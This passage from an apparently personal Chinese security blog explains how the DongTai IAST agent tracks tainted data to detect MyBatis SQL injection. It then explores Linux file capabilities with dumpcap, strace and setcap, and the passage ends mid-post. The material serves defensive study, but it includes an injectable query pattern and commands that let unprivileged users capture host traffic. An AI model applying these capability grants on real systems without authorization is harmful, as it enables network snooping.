System.out.println(b.next()); &#x2F;&#x2F; &quot;123&quot;会被标记成污点</span><br><span class="line"></span><br><span class="line">    File f &#x3D; new File(&quot;123&quot;);   </span><br><span class="line">    return f.getName(); &#x2F;&#x2F; 返回值&quot;123&quot;被认为是可控的,会产生误报</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/1846319/193067749-f933545d-b36a-49a9-aec7-6bf35997cad5.png"></p>
<p>iast为什么会认为”123”是污点呢？</p>
<p>因为执行<code>a.add(name)</code>时,下面的传播规则会使得<code>a</code>对象变成污点<br><img src="https://user-images.githubusercontent.com/1846319/193058681-5b1ecf68-73c5-4c4d-b7e1-6be5862dbb29.png"></p>
<p>在执行<code>b.next()</code>时,<code>iterator.next()</code>传播规则会让<code>123</code>字符串变成污点<br><img src="https://user-images.githubusercontent.com/1846319/193060076-0249cbe1-90db-438a-bcd7-bae5f3a1ad54.png"></p>
<h1 id="流程浅析"><a href="#流程浅析" class="headerlink" title="流程浅析"></a>流程浅析</h1><p>collectMethodPool方法串联了”最重要”的业务流程。当java-agent启动时,会拉取server端规则,然后根据规则hook类,确保在被hook的方法执行前或者执行后能调用到collectMethodPool方法。在处理http请求时,collectMethodPool方法会判断当前是属于哪一类规则,并做对应的动作。</p>
<p>你可以从java-agent启动时和请求过来时两个场景来看业务逻辑。</p>
<p>java-agent启动时会找到所有jvm已经加载的类并重写字节码,如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;HXSecurity&#x2F;DongTai-agent-java&#x2F;blob&#x2F;v1.7.7&#x2F;dongtai-core&#x2F;src&#x2F;main&#x2F;java&#x2F;io&#x2F;dongtai&#x2F;iast&#x2F;core&#x2F;bytecode&#x2F;IastClassFileTransformer.java#L250</span><br><span class="line"></span><br><span class="line">public void reTransform() &#123;</span><br><span class="line">    ...</span><br><span class="line">    Class&lt;?&gt;[] waitingReTransformClasses &#x3D; findForRetransform();    &#x2F;&#x2F; 找到所有待重写的类</span><br><span class="line">    ...</span><br><span class="line">    for (Class&lt;?&gt; clazz : waitingReTransformClasses) &#123;</span><br><span class="line">    ...</span><br><span class="line">          inst.retransformClasses(clazz);   &#x2F;&#x2F; 用asm重新生成字节码</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此实现了对污点源方法、传播方法、危险方法的hook,并且使得执行方法前或者执行方法后,调用captureMethodState方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 污点源方法: https:&#x2F;&#x2F;github.com&#x2F;HXSecurity&#x2F;DongTai-agent-java&#x2F;blob&#x2F;v1.7.7&#x2F;dongtai-core&#x2F;src&#x2F;main&#x2F;java&#x2F;io&#x2F;dongtai&#x2F;iast&#x2F;core&#x2F;bytecode&#x2F;enhance&#x2F;plugin&#x2F;core&#x2F;adapter&#x2F;SourceAdviceAdapter.java#L26</span><br><span class="line">public class SourceAdviceAdapter extends AbstractAdviceAdapter &#123;</span><br><span class="line">  ...</span><br><span class="line">  @Override</span><br><span class="line">  protected void after(int opcode) &#123;</span><br><span class="line">      ...</span><br><span class="line">      captureMethodState(opcode, HookType.SOURCE.getValue(), true);</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 传播方法: https:&#x2F;&#x2F;github.com&#x2F;HXSecurity&#x2F;DongTai-agent-java&#x2F;blob&#x2F;v1.7.7&#x2F;dongtai-core&#x2F;src&#x2F;main&#x2F;java&#x2F;io&#x2F;dongtai&#x2F;iast&#x2F;core&#x2F;bytecode&#x2F;enhance&#x2F;plugin&#x2F;core&#x2F;adapter&#x2F;PropagateAdviceAdapter.java#L31</span><br><span class="line">public class PropagateAdviceAdapter extends AbstractAdviceAdapter &#123;</span><br><span class="line">  ...</span><br><span class="line">  @Override</span><br><span class="line">  protected void after(final int opcode) &#123;</span><br><span class="line">      ...</span><br><span class="line">      captureMethodState(opcode, HookType.PROPAGATOR.getValue(), true);</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 危险方法: https:&#x2F;&#x2F;github.com&#x2F;HXSecurity&#x2F;DongTai-agent-java&#x2F;blob&#x2F;v1.7.7&#x2F;dongtai-core&#x2F;src&#x2F;main&#x2F;java&#x2F;io&#x2F;dongtai&#x2F;iast&#x2F;core&#x2F;bytecode&#x2F;enhance&#x2F;plugin&#x2F;core&#x2F;adapter&#x2F;SinkAdviceAdapter.java#L31</span><br><span class="line">public class SinkAdviceAdapter extends AbstractAdviceAdapter &#123;</span><br><span class="line">  ...</span><br><span class="line">  @Override</span><br><span class="line">  protected void before() &#123;</span><br><span class="line">      ...</span><br><span class="line">      captureMethodState(-1, HookType.SINK.getValue(), false);</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>captureMethodState 最终会调用collectMethodPool方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;HXSecurity&#x2F;DongTai-agent-java&#x2F;blob&#x2F;v1.7.7&#x2F;dongtai-core&#x2F;src&#x2F;main&#x2F;java&#x2F;io&#x2F;dongtai&#x2F;iast&#x2F;core&#x2F;bytecode&#x2F;enhance&#x2F;plugin&#x2F;AbstractAdviceAdapter.java#L103</span><br><span class="line"></span><br><span class="line">protected void captureMethodState(</span><br><span class="line">        final int opcode,</span><br><span class="line">        final int hookValue,</span><br><span class="line">        final boolean captureRet</span><br><span class="line">) &#123;</span><br><span class="line">    ...</span><br><span class="line">    invokeInterface(ASM_TYPE_SPY_DISPATCHER, SPY$collectMethodPool);</span><br><span class="line">    pop();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;HXSecurity&#x2F;DongTai-agent-java&#x2F;blob&#x2F;v1.7.7&#x2F;dongtai-core&#x2F;src&#x2F;main&#x2F;java&#x2F;io&#x2F;dongtai&#x2F;iast&#x2F;core&#x2F;bytecode&#x2F;enhance&#x2F;asm&#x2F;AsmMethods.java#L131</span><br><span class="line"></span><br><span class="line">Method SPY$collectMethodPool &#x3D; InnerHelper.getAsmMethod(</span><br><span class="line">        SpyDispatcher.class,</span><br><span class="line">        &quot;collectMethodPool&quot;,</span><br><span class="line">        ...</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>请求过来时,就会执行到collectMethodPool方法,方法中根据hookType处理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;HXSecurity&#x2F;DongTai-agent-java&#x2F;blob&#x2F;v1.7.7&#x2F;dongtai-core&#x2F;src&#x2F;main&#x2F;java&#x2F;io&#x2F;dongtai&#x2F;iast&#x2F;core&#x2F;handler&#x2F;hookpoint&#x2F;SpyDispatcherImpl.java#L462</span><br><span class="line"></span><br><span class="line">@Override</span><br><span class="line">public boolean collectMethodPool(Object instance, Object[] argumentArray, Object retValue, String framework,</span><br><span class="line">                                 String className, String matchClassName, String methodName, String methodSign, boolean isStatic,</span><br><span class="line">                                 int hookType) &#123;</span><br><span class="line">    &#x2F;&#x2F; hook点降级判断</span><br><span class="line">    ...</span><br><span class="line">    &#x2F;&#x2F; 尝试获取hook限速令牌,耗尽时降级</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    MethodEvent event &#x3D; new MethodEvent(0, -1, className, matchClassName, methodName,</span><br><span class="line">            methodSign, methodSign, instance, argumentArray, retValue, framework, isStatic, null);</span><br><span class="line">    if (HookType.HTTP.equals(hookType)) &#123;</span><br><span class="line">        HttpImpl.solveHttp(event);</span><br><span class="line">    &#125; else if (HookType.RPC.equals(hookType)) &#123;</span><br><span class="line">        solveRPC(framework, event);</span><br><span class="line">    &#125; else if (HookType.PROPAGATOR.equals(hookType) &amp;&amp; !EngineManager.TAINT_POOL.isEmpty()) &#123;   &#x2F;&#x2F; 处理传播方法</span><br><span class="line">        PropagatorImpl.solvePropagator(event, INVOKE_ID_SEQUENCER);</span><br><span class="line">    &#125; else if (HookType.SOURCE.equals(hookType)) &#123;  &#x2F;&#x2F; 处理污点源方法</span><br><span class="line">        SourceImpl.solveSource(event, INVOKE_ID_SEQUENCER);</span><br><span class="line">    &#125; else if (HookType.SINK.equals(hookType)) &#123;    &#x2F;&#x2F; 处理危险方法</span><br><span class="line">        SinkImpl.solveSink(event);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="举个例子：怎么检测接口是否存在SQL注入风险？"><a href="#举个例子：怎么检测接口是否存在SQL注入风险？" class="headerlink" title="举个例子：怎么检测接口是否存在SQL注入风险？"></a>举个例子：怎么检测接口是否存在SQL注入风险？</h1><p>后端服务用mybatis时,<code>$&#123;变量&#125;</code>的sql写法容易造成sql注入,而<code>#&#123;变量&#125;</code>底层会使用预编译通常不会产生sql注入问题,如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 第一个sql：存在sql注入</span><br><span class="line">select * from user where name&#x3D;$&#123;name&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 第二个sql：不存在sql注入</span><br><span class="line">select * from user where name&#x3D;#&#123;name&#125;</span><br></pre></td></tr></table></figure>

<p>当用户请求<code>/user?name=admin</code>时,iast是怎么检查出第一种接口存在SQL注入风险,而不会对第二种接口误报呢？</p>
<p>实际上如果我们调试一下,就知道<code>#</code>和<code>$</code>的写法调用的sql接口是有区别的,如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 使用$&#123;name&#125;时</span><br><span class="line">conn.prepareStatement(&quot;select * from user where name&#x3D;&quot;admin&quot;)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 使用#&#123;name&#125;时</span><br><span class="line">pstmt&#x3D;conn.prepareStatement(&quot;select * from user where name&#x3D;?)</span><br><span class="line">pstmt.setString(1, &quot;admin&quot;)</span><br></pre></td></tr></table></figure>

<p>洞态iast默认有一个危险方法规则是<code>java.sql.Connection.prepareStatement(java.lang.String)</code>,当第一个参数是污点时,就会告警,规则如下。<br><img src="https://user-images.githubusercontent.com/1846319/193008318-d7890a20-4bf8-4c2f-a12a-68436d749ddc.png"></p>
<p>所以使用${name}时,<code>admin</code>字符串对象是污点,<code>&quot;select * from user where name=&quot;admin&quot;</code>字符串对象也会被标记成污点,于是命中危险方法规则,产生告警。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>学习iast时阅读官方文档和代码调试很有用,java-agent调试可以看 <a target="_blank" rel="noopener" href="https://doc.dongtai.io/docs/development/dongtai-java-agent-doc/agent-debug">https://doc.dongtai.io/docs/development/dongtai-java-agent-doc/agent-debug</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-09-07-%E5%85%B3%E4%BA%8E%22linux%20capability%22%E7%9A%84%E4%B8%A4%E4%B8%AA%E7%89%B9%E6%AE%8A%E6%A1%88%E4%BE%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-09-07-%E5%85%B3%E4%BA%8E%22linux%20capability%22%E7%9A%84%E4%B8%A4%E4%B8%AA%E7%89%B9%E6%AE%8A%E6%A1%88%E4%BE%8B/" class="post-title-link" itemprop="url">关于"linux capability"的两个特殊案例</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-09-07 14:51:10" itemprop="dateCreated datePublished" datetime="2022-09-07T14:51:10+08:00">2022-09-07</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-09-10 10:35:44" itemprop="dateModified" datetime="2022-09-10T10:35:44+08:00">2022-09-10</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>虽然官方文档(man capabilities)和《Linux 内核安全模块深入剖析》书的第六章对”能力”有很全面详细的描述，但是我之前遇到了两个和能力有关的案例，从文档中看不出来原因，只好猜测原因并从源码中确认结论。</p>
<p>本文记录这两个特殊案例，加深自己对”能力”概念的理解，也希望能对linux安全有兴趣的读者有点帮助。</p>
<p>第一个案例是普通用户执行<code>dumpcap</code>时可以按照预期运行，而<code>strace dumpcap</code>时提示权限不足。如下</p>
<p><img src="https://user-images.githubusercontent.com/1846319/188832721-3d1d74e3-e94f-4389-9ccf-ac930bc43403.png"></p>
<p>更详细的问题背景可以见正文，或者看我提的issue： <a target="_blank" rel="noopener" href="https://github.com/strace/strace/issues/221">https://github.com/strace/strace/issues/221</a></p>
<p>第二个案例是我好奇root用户执行<code>su - test</code>变成非root用户后会有哪些能力？</p>
<p>先来看第一个案例。</p>
<h1 id="普通用户执行strace-dumpcap时提示权限不足"><a href="#普通用户执行strace-dumpcap时提示权限不足" class="headerlink" title="普通用户执行strace dumpcap时提示权限不足"></a>普通用户执行<code>strace dumpcap</code>时提示权限不足</h1><h2 id="研究这个问题的起因"><a href="#研究这个问题的起因" class="headerlink" title="研究这个问题的起因"></a>研究这个问题的起因</h2><p>在 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/UL7Rd56MtSB6If_Tu_2N7w">基于netfilter的后门</a> 文章中，我最早是用<code>dumpcap -i nflog:2333</code>代替<code>tcpdump -i nflog:2333</code>抓包的。</p>
<p>我在安装dumpcap命令、添加x权限后，发现非root用户也可以用dumpcap抓整个主机上的包。如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# yum install wireshark -y    &#x2F;&#x2F; 安装dumpcap命令</span><br><span class="line">[root@instance-h9w7mlyv ~]# chmod +x &#x2F;usr&#x2F;bin&#x2F;dumpcap   &#x2F;&#x2F; 添加执行权限</span><br><span class="line">[test@instance-h9w7mlyv ~]$ dumpcap -i eth0     &#x2F;&#x2F; 抓eth0网卡的包</span><br><span class="line">Capturing on &#39;eth0&#39;</span><br><span class="line">File: &#x2F;var&#x2F;tmp&#x2F;wireshark_eth0_20220907165305_9Quu6X.pcapng</span><br><span class="line">Packets captured: 17</span><br><span class="line">Packets received&#x2F;dropped on interface &#39;eth0&#39;: 17&#x2F;0 (pcap:0&#x2F;dumpcap:0&#x2F;flushed:0&#x2F;ps_ifdrop:0) (100.0%)</span><br></pre></td></tr></table></figure>

<p>一个普通用户能够获取主机上的所有流量，听着就很不安全，所以我就想看看为什么非root用户可以用dumpcap命令监听网卡流量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[test@instance-h9w7mlyv ~]$ getcap &#x2F;usr&#x2F;bin&#x2F;dumpcap</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;dumpcap &#x3D; cap_net_admin,cap_net_raw+ep</span><br></pre></td></tr></table></figure>
<p>如上，可以看到dumpcap有<code>cap_net_raw</code>文件能力。或许你知道只要线程有<code>cap_net_raw</code>能力，就可以用<code>socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))</code>创建socket来抓包。</p>
<p>所以可以猜测dumpcap也是用<code>AF_PACKET socket</code>抓包的，于是我想执行<code>strace dumpcap</code>看一下系统调用中是否有创建<code>AF_PACKET socket</code>。然后发现普通用户执行<code>strace dumpcap</code>时提示报错，如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[test@instance-h9w7mlyv ~]$ strace -o strace.log dumpcap</span><br><span class="line">Capturing on &#39;eth0&#39;</span><br><span class="line">dumpcap: The capture session could not be initiated on interface &#39;eth0&#39; (You don&#39;t have permission to capture on that device).</span><br><span class="line">Please check to make sure you have sufficient permissions.</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>这里就让我感觉很奇怪：为什么普通用户执行<code>dumpcap</code>时可以按照预期运行，而<code>strace dumpcap</code>时提示权限不足？</p>
<blockquote>
<p>还有类似的现象：普通用户<code>strace ping www.baidu.com</code>也会提示权限不足</p>
</blockquote>
<h2 id="为什么普通用户执行strace-dumpcap时提示权限不足？"><a href="#为什么普通用户执行strace-dumpcap时提示权限不足？" class="headerlink" title="为什么普通用户执行strace dumpcap时提示权限不足？"></a>为什么普通用户执行<code>strace dumpcap</code>时提示权限不足？</h2><p><code>man execve</code>看到下面一段文档</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">The aforementioned transformations of the effective IDs are not performed (i.e., the set-user-ID and set-group-ID bits are ignored) if any of the following is true:</span><br><span class="line"></span><br><span class="line"> *  the no_new_privs attribute is set for the calling thread (see prctl(2));</span><br><span class="line"></span><br><span class="line"> *  the underlying filesystem is mounted nosuid (the MS_NOSUID flag for mount(2)); or</span><br><span class="line"></span><br><span class="line"> *  the calling process is being ptraced.   &#x2F;&#x2F; 进程正在被ptrace</span><br><span class="line"></span><br><span class="line">The capabilities of the program file (see capabilities(7)) are also ignored if any of the above are true.</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><code>man capabilities</code></a>看到下面一段文档</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Note: the capability transitions described above may not be performed (i.e., file capabilities may be ignored) for the same reasons that the set-user-ID and set-group-ID bits are ignored; see</span><br><span class="line">execve(2).</span><br></pre></td></tr></table></figure>

<p>从文档得出结论：只要进程被ptrace，那么execve时就会忽略文件能力和set-uid/set-gid等。因为strace底层就是ptrace，所以似乎这个结论可以解释我遇到的现象。</p>
<p>但是当用root用户给strace文件添加能力后，普通用户运行<code>strace dumpcap</code>又可以正常工作，上面的结论就解释不通了。如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# setcap cap_net_admin,cap_net_raw+ep &#x2F;usr&#x2F;bin&#x2F;strace   &#x2F;&#x2F; 给strace文件添加能力</span><br><span class="line">[root@instance-h9w7mlyv ~]#</span><br><span class="line">[root@instance-h9w7mlyv ~]# su - test     &#x2F;&#x2F; 切换到普通用户</span><br><span class="line">...</span><br><span class="line">[test@instance-h9w7mlyv ~]$ getcap &#x2F;usr&#x2F;bin&#x2F;strace</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;strace &#x3D; cap_net_admin,cap_net_raw+ep</span><br><span class="line">[test@instance-h9w7mlyv ~]$ getcap &#x2F;usr&#x2F;bin&#x2F;dumpcap</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;dumpcap &#x3D; cap_net_admin,cap_net_raw+ep</span><br><span class="line">[test@instance-h9w7mlyv ~]$ strace -o strace.log dumpcap      &#x2F;&#x2F; strace dumpcap现在可以抓包</span><br><span class="line">Capturing on &#39;eth0&#39;</span><br><span class="line">File: &#x2F;var&#x2F;tmp&#x2F;wireshark_eth0_20220908182215_A7Uikl.pcapng</span><br><span class="line">Packets captured: 11</span><br><span class="line">Packets received&#x2F;dropped on interface &#39;eth0&#39;: 11&#x2F;0 (pcap:0&#x2F;dumpcap:0&#x2F;flushed:0&#x2F;ps_ifdrop:0) (100.0%)</span><br></pre></td></tr></table></figure>

<p>所以看起来，普通用户执行<code>strace dumpcap</code>后dumpcap进程的有效能力集是strace文件能力和dumpcap文件能力交集。</p>
<p>那到底是不是这样呢？</p>
<h2 id="是不是交集"><a href="#是不是交集" class="headerlink" title="是不是交集?"></a>是不是交集?</h2><p><code>strace dumpcap</code>时,从用户态看strace原理大概如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; fork后，strace子进程能力集和strace进程是相同的</span><br><span class="line">pid_t pid &#x3D; fork();</span><br><span class="line">&#x2F;&#x2F; 子进程</span><br><span class="line">if (pid &#x3D;&#x3D; 0) &#123;</span><br><span class="line">    ptrace(PTRACE_TRACEME,0,NULL,NULL);</span><br><span class="line">    &#x2F;&#x2F; 加载被调试的程序</span><br><span class="line">    execve(&quot;&#x2F;usr&#x2F;bin&#x2F;dumpcap&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/441291330">Linux ptrace 的实现</a></p>
</blockquote>
<p>内核在执行execve时，会执行到cap_bprm_set_creds函数，函数栈如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# bpftrace -e &#39;kprobe:cap_bprm_set_creds &#123;printf(&quot;%s\n&quot;,kstack)&#125;&#39;</span><br><span class="line">Attaching 1 probe...</span><br><span class="line"></span><br><span class="line">        cap_bprm_set_creds+1</span><br><span class="line">        security_bprm_set_creds+34</span><br><span class="line">        prepare_binprm+299</span><br><span class="line">        do_execveat_common.isra.37+1274</span><br><span class="line">        __x64_sys_execve+50   &#x2F;&#x2F; execve系统调用入口</span><br><span class="line">        do_syscall_64+91</span><br><span class="line">        entry_SYSCALL_64_after_hwframe+101</span><br></pre></td></tr></table></figure>

<p>代码位置在：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.18/source/security/commoncap.c#L854">https://elixir.bootlin.com/linux/v4.18/source/security/commoncap.c#L854</a></p>
<p>可以看到cap_bprm_set_creds函数会对能力做交集</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">int cap_bprm_set_creds(struct linux_binprm *bprm)</span><br><span class="line">&#123;</span><br><span class="line">	const struct cred *old &#x3D; current_cred();</span><br><span class="line">	struct cred *new &#x3D; bprm-&gt;cred;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">  ret &#x3D; get_file_caps(bprm, &amp;effective, &amp;has_fcap);    &#x2F;&#x2F; 会从文件扩展属性中找到能力集合，赋值给brpm-&gt;cred相应字段</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">	if ((is_setid || __cap_gained(permitted, new, old)) &amp;&amp;</span><br><span class="line">	    ((bprm-&gt;unsafe &amp; ~LSM_UNSAFE_PTRACE) ||</span><br><span class="line">	     !ptracer_capable(current, new-&gt;user_ns))) &#123;</span><br><span class="line">		&#x2F;* downgrade; they get no more than they had, and maybe less *&#x2F;</span><br><span class="line">		if (!ns_capable(new-&gt;user_ns, CAP_SETUID) ||</span><br><span class="line">		    (bprm-&gt;unsafe &amp; LSM_UNSAFE_NO_NEW_PRIVS)) &#123;</span><br><span class="line">			new-&gt;euid &#x3D; new-&gt;uid;</span><br><span class="line">			new-&gt;egid &#x3D; new-&gt;gid;</span><br><span class="line">		&#125;</span><br><span class="line">		new-&gt;cap_permitted &#x3D; cap_intersect(new-&gt;cap_permitted,    &#x2F;&#x2F; new-&gt;cap_permitted是execve后的进程允许能力集，当前的值是dumpcap文件的允许能力集</span><br><span class="line">						   old-&gt;cap_permitted);   &#x2F;&#x2F; old-&gt;cap_permitted是当前进程的允许能力集，也就是strace fork后子进程的能力集</span><br><span class="line">	&#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那strace进程的能力集是怎么来的呢？</p>
<h2 id="strace进程的能力集是怎么来的呢？"><a href="#strace进程的能力集是怎么来的呢？" class="headerlink" title="strace进程的能力集是怎么来的呢？"></a>strace进程的能力集是怎么来的呢？</h2><p>strace进程能力是根据bash进程能力和strace文件能力，按照计算规则得来的，如下</p>
<p><img src="https://user-images.githubusercontent.com/1846319/189352414-8ad8430f-7c55-4288-a645-dd834de4aaf1.png"></p>
<p>那普通用户的bash进程能力集又是啥呢？它是怎么计算出来的呢？ 这就是我的第二个疑问</p>
<h1 id="普通用户的bash进程能力集是啥？"><a href="#普通用户的bash进程能力集是啥？" class="headerlink" title="普通用户的bash进程能力集是啥？"></a>普通用户的bash进程能力集是啥？</h1><p>如下，可以看到普通用户的bash进程除了<code>限制能力集</code>其他能力集都是0</p>
